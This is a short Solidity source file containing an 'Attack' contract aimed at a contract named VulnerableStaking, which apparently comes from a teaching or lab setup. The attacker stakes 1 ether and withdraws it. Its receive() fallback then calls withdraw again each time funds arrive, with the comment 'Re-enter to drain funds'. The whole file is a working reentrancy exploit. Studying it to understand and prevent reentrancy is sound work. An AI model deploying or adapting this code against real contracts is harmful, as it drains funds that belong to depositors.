//SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "./Vuln.sol";

contract Attack {
    VulnerableStaking target;

    constructor(address payable _target) payable {
        target = VulnerableStaking(_target); 
    }

    function attack() public payable {
        target.stake{value: 1 ether}();
        target.withdraw(1 ether);
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw(1 ether); // Re-enter to drain funds
        }
    }
}
